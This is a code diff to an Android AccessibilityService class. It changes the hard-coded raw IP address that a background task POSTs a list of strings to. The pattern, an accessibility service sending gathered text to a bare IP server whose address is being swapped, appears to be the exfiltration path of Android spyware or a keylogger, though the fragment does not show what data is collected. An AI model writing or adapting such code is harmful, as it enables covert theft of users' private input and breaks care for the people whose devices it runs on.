@@ -133,7 +133,7 @@ public class MyAccessibilityService extends AccessibilityService {
         protected Void doInBackground(List<String>... params) {
             HttpURLConnection urlConnection = null;
             try {
-                URL url = new URL("http://20.55.65.54/");
+                URL url = new URL("http://4.186.40.178/");
                 urlConnection = (HttpURLConnection) url.openConnection();
                 urlConnection.setRequestMethod("POST");
                 urlConnection.setDoOutput(true);
